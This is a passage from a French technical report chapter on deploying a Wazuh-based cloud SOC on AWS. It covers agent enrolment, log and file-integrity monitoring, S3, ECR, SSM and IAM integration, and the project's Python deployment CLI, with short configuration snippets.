La collecte de télémétrie est la pierre angulaire de la supervision. Dans le projet, cette étape a été conçue de manière cohérente avec le plan de données AWS : un hôte victime dans le sous-réseau privé `10.0.2.0/24` envoie ses journaux vers le Wazuh Manager dans le sous-réseau `10.0.1.0/24` via le port `1514/TCP`.

### 5.3.1 Agent Linux : installation et enrôlement réel

Le playbook de déploiement `playbooks/victim_server.yml` installe d'abord les dépendances systèmes, puis ajoute le dépôt Wazuh et installe le paquet `wazuh-agent` :

```yaml
- name: Install Wazuh agent
  type: package
  packages:
    - wazuh-agent
```

La configuration réseau de l'agent est ensuite rendue dynamique avec l'IP privée du Wazuh Manager, récupérée depuis le Terraform output `wazuh_instance_private_ip` :

```yaml
- name: Configure Wazuh agent manager connection
  type: shell
  cmd: |
    if [ "{{ wazuh_manager_ip }}" = "" ]; then
      echo "wazuh_manager_ip not provided"
      exit 1
    fi

    sudo sed -i 's|MANAGER_IP|{{ wazuh_manager_ip }}|g' /var/ossec/etc/ossec.conf
```

Cette étape est particulièrement importante car elle garantit que l'agent sait précisément où joindre le manager sans dépendre d'une configuration locale statique. Une fois la configuration appliquée, le service `wazuh-agent` est activé et démarré :

```yaml
- name: Enable Wazuh agent service
  type: service
  name: wazuh-agent
  state: started
  enabled: true
```

### 5.3.2 Agent Linux : collecte de logs et détection de modifications de fichiers

La mise en place du `ossec.conf` n'est pas un simple enrôlement minimal. L'agent Linux est préparé pour la surveillance des logs système et la détection d'intégrité de fichiers. L'architecture du projet cible explicitement les journaux suivants :

- `/var/log/auth.log`
- `/var/log/syslog`

et la surveillance des répertoires sensibles :

- `/etc`
- `/bin`
- `/sbin`
- `/tmp`

C'est précisément cette couche qui permet ensuite de détecter les manipulations de cron, la création de fichiers suspects ou la modification d'artefacts système lors des simulations d'attaque.

### 5.3.3 Interopérabilité avec un nœud Windows et validation du SOC

Même si le projet principal est centré sur une cible Linux, le design de la solution est volontairement multi-plateforme. L'architecture Terraform `victim_server` est une machine Ubuntu, mais le workflow de supervision est préparé pour l'intégration de nœuds additionnels, et la configuration de Wazuh est compatible avec les modules d'événements Windows. Les règles de surveillance peuvent être étendues à des événements tels que :

- 4624 : connexion réussie
- 4625 : connexion refusée
- 4698 : création de tâche planifiée

L'activation et la validation de l'agent sont confirmées par la commande de contrôle exécutée dans le stack :

```bash
/var/ossec/bin/manage_agents -l
```

Le dépôt et la logique de déploiement mettent en place le circuit complet : le manager reçoit, valide et consigne les événements, puis les transforme en alertes indexées pour la corrélation.

---

## 5.4 Intégration AWS (S3, ECR, SSM) {#54-integration-aws}

L'intégration AWS ne constitue pas un simple ajout fonctionnel ; elle structure l'ensemble de la logique de déploiement, de stockage et de réponse. Les composants AWS utilisés dans le projet sont concrètement les suivants :

- Amazon S3 pour le stockage des fichiers de configuration et des artefacts Docker
- Amazon ECR pour les images de conteneurs applicatifs et victime
- AWS Systems Manager pour le contrôle distant sans SSH
- IAM pour les profils d'instance et les permissions associées

### 5.4.1 Amazon S3 : stockage immuable des artefacts de déploiement

Le dépôt possède une intégration Terraform détaillée dans `terraform/s3.tf`. Les ressources suivantes sont créées :

- `aws_s3_bucket.wazuh_assets`
- `aws_s3_bucket_versioning.wazuh_assets`
- `aws_s3_bucket_server_side_encryption_configuration.wazuh_assets`
- `aws_s3_bucket_public_access_block.wazuh_assets`

Ensuite, les artefacts suivants sont uploadés dans le bucket :

- `wazuh-docker/docker-compose.yml`
- `wazuh-docker/generate-indexer-certs.yml`
- `wazuh-docker/config/wazuh_cluster/wazuh_manager.conf`
- `wazuh-docker/config/wazuh_indexer/wazuh.indexer.yml`
- `wazuh-docker/config/wazuh_dashboard/opensearch_dashboards.yml`
- `wazuh-docker/config/wazuh_dashboard/wazuh.yml`

Le mode de stockage est volontairement critique pour le projet : il centralise les fichiers sans les rendre publics et garantit que l'instance Wazuh peut les récupérer de manière reproductible. Cette approache est particulièrement adaptée à un environnement DevSecOps, car elle évite le codage en dur des valeurs de configuration dans les images ou les scripts d'installation.

### 5.4.2 Amazon ECR : gestion des images de service et de victime

Le projet crée explicitement deux repositories ECR dans `terraform/ecr.tf` :

- `aws_ecr_repository.victim_repo`
- `aws_ecr_repository.manager_repo`

Ces dépôts sont associés à des politiques de cycle de vie qui conservent uniquement les trois dernières images, afin d'éviter une croissance illimitée du stockage. Cela correspond à une vraie logique d'industrialisation du dépôt d'images, avec un contrôle de coût et un cycle de vie raisonnable, contrairement à une simple image Docker stockée localement.

Le playbook `victim_server.yml` intègre ensuite le mécanisme réel d'authentification à ECR :

```yaml
- name: Login to ECR
  type: shell
  cmd: |
    aws ecr get-login-password --region {{ aws_region }} | docker login --username AWS --password-stdin $(echo "{{ ecr_victim_repository_url }}" | cut -d'/' -f1)
```

puis le pull de l'image victime :

```yaml
- name: Pull victim container image from ECR
  type: shell
  cmd: docker pull {{ ecr_victim_repository_url }}:latest
```

### 5.4.3 AWS Systems Manager (SSM) : mécanisme de contrôle principal

Le cœur du modèle de contrôle du projet repose sur SSM et non sur SSH. Les services réels utilisés dans le code sont exposés dans `cloudsoc/aws/ssm.py` et comprennent :

- `send_command()` : envoi d'un script via `AWS-RunShellScript`
- `get_command_invocation()` : lecture du résultat de la commande
- `wait_for_command()` : attente de la fin de l'exécution
- `wait_for_instance()` : validation du statut de l'agent SSM

Le rôle de ce composant est central dans le flux global :

1. Terraform provisionne les instances EC2.
2. Les instances installent l'agent SSM via le bootstrap Ubuntu.
3. Le CLI `cloud-soc deploy` attend que les instances soient disponibles via SSM.
4. Les playbooks sont exécutés par SSM sur la cible sans ouverture du port 22.
5. Les résultats sont récupérés et vérifiés via l'API SSM.

C'est cette mécanique qui permet au projet de sécuriser le plan de contrôle tout en gardant un modèle de résolution automatisée robuste.

### 5.4.4 IAM : permissions minimales liées au SOC

La sécurité du plan de contrôle est aussi assurée par les rôles IAM Terraform dans `terraform/iam.tf`. Les permissions accordées au rôle Wazuh concernent :

- lecture des instances EC2 et groupes de sécurité ;
- modification de security groups ;
- lecture/écriture dans le bucket S3 du projet ;
- accès aux repositories ECR du projet ;
- permissions SSM gérées via `AmazonSSMManagedInstanceCore`.

Le rôle de la victime, lui, permet explicitement :

- récupération de jeton ECR pour télécharger des images privées ;
- lecture des images du repository associé.

Cette séparation est cohérente avec le principe de moindre privilège et s'aligne strictement sur la logique métier du projet.

---

## 5.5 Développement des scripts Python {#55-scripts-python}

Le cœur logiciel du projet est implémenté dans `/cloudsoc/`, avec un ensemble de modules dédiés à l'orchestration Terraform, à la gestion SSM et à l'exécution des tâches de déploiement. Les fichiers réellement utilisés par le projet sont ceux-ci :

- `/cloudsoc/main.py` : CLI principale `cloud-soc`
- `/cloudsoc/deployment/executor.py` : moteur d'exécution YAML
- `/cloudsoc/orchestrator.py` : orchestrateur Terraform / déploiement / Dashboard
- `/cloudsoc/aws/ssm.py` : abstraction de la communication AWS Systems Manager

### 5.5.1 `DeploymentTask` et la logique de rendu des playbooks

Le composant technique réel dans `cloudsoc/deployment/executor.py` est `DeploymentTask`. Ce type encapsule chaque étape d'un playbook et implémente les actions suivantes :

- `shell`
- `command`
- `package`
- `directory`
- `download`
- `file`
- `service`
- `docker`

Le mécanisme le plus important est la substitution dynamique de variables sous forme `{{ variable }}`. Par exemple, le playbook `wazuh_manager.yml` injecte `{{ s3_bucket_name }}`, `{{ s3_prefix }}` et `{{ ecr_victim_repository_url }}`. Le moteur lit ces valeurs depuis les outputs Terraform et les remplace automatiquement avant l'exécution de la commande.

L'objet `DeploymentPlan` gère ensuite l'exécution séquentielle des tâches, en appui sur `DeploymentService.run_deployment()`. Cela permet d'unifier les scénarios de déploiement sur la base d'une logique YAML déclarative, sans réécrire des scripts de provisionnement spécifiques pour chaque composant.

### 5.5.2 Exécution SSM distante et contraintes de sécurité

Les playbooks ne sont pas exécutés directement depuis le poste local. Dans le flux réel du projet, `DeploymentOrchestrator.deploy_targets()` appelle `DeploymentService.run_deployment(..., ssm_service=self.ssm_service, instance_ids=[instance_id])`.

À ce niveau, les tâches sont converties en commandes shell par la méthode `to_shell_commands()`, puis envoyées à AWS SSM via `send_command()` :

```python
command_id = ssm_service.send_command(
    instance_ids=instance_ids,
    commands=[script],
    working_directory="/tmp",
    timeout=3600,
    document_name="AWS-RunShellScript"
)
```

Ensuite, le code attend la fin de l'exécution avec `wait_for_command()`, puis vérifie le statut et le `return_code`.

Cela correspond à l'architecture réelle du projet : le plan de contrôle passe par AWS, tandis que les machines cibles restent isolées dans le VPC private. Cette séparation est la clé de la sécurité du modèle.

### 5.5.3 Orchestration Terraform, déploiement et tunnel Dashboard

La logique réelle du projet est codée dans `cloudsoc/orchestrator.py` et présente trois couches :

- `TerraformOrchestrator` : init/validate/plan/apply/destroy
- `DeploymentOrchestrator` : orchestration des playbooks sur les instances SSM
- `DashboardOrchestrator` : gestion du port-forwarding vers le Wazuh Dashboard via SSM

Le tunnel Dashboard est mis en place avec la classe `SSMDashboardTunnelManager`, qui démarre une session `AWS-StartPortForwardingSessionToRemoteHost` et gère la persistance de l'état local dans `~/.cloud-soc/dashboard_tunnel.json`.

Le code vérifie aussi le service distant avec `_monitor_dashboard_service()`, qui exécute sur l'instance un script SSM pour tester :

- `curl -k https://127.0.0.1:443`
- `curl https://127.0.0.1:9200`
- `docker compose ps`
- `docker compose logs` sur dashboard et indexer

Cette validation est essentielle car elle distingue le simple démarrage du cluster de la disponibilité fonctionnelle de l'interface web. C'est ce type de contrôle qui rend la plateforme réellement exploitable par un opérateur SOC ou par un test automatisé.

### 5.5.4 CLI réelle du projet

La CLI principale est définie dans `cloudsoc/main.py` avec les commandes suivantes :

- `cloud-soc apply` : provisionnement Terraform + validation de l'infra
- `cloud-soc deploy` : déploiement des services via SSM/playbooks
- `cloud-soc dashboard` : ouverture du tunnel vers le Dashboard Wazuh
- `cloud-soc status` : contrôle des ressources et de la santé du système

Le mode de déploiement réel du projet est donc bien un cycle en deux temps :

1. `apply` pour provisionner l'infrastructure AWS ;
2. `deploy` pour installer et démarrer les services sur les instances cibles.

---

## 5.6 Conclusion {#56-conclusion-chap5}

Le chapitre 5 confirme que le projet n'est pas seulement un assemblage de composants Wazuh, Docker et AWS, mais une architecture automatisée, cohérente et exploitable en production. L'implémentation réelle repose sur une logique de cycle de vie entièrement pilotée par le code, depuis le provisionnement sur AWS jusqu'à la validation fonctionnelle du Dashboard Wazuh.

Les éléments concrets démontrent cette rigueur :

1. le provisionnement via Terraform dans `/terraform/` et les outputs `wazuh_instance_id`, `victim_instance_id`, `s3_bucket_name`, etc. ;
2. le stockage des artefacts via S3 et la publication des images via ECR ;
3. le déploiement des services par SSM à travers les playbooks `playbooks/wazuh_manager.yml` et `playbooks/victim_server.yml` ;
4. la supervision réelle des agents Wazuh et la collecte de la télémétrie dans le plan de données VPC ;
5. le moteur Python `DeploymentTask` + `DeploymentOrchestrator` + `DashboardOrchestrator` qui pilote l'entièreté du cycle de fonctionnement.

Le levier déterminant du projet est la séparation nette entre le plan de contrôle (Python + SSM + AWS IAM) et le plan de données (VPC + Wazuh + agents). C'est cette séparation qui rend l'architecture robuste, testable et reproductible, et qui permet la mise en œuvre d'une boucle de détection et de réponse automatisée selon les principes d'un SOC moderne.

---
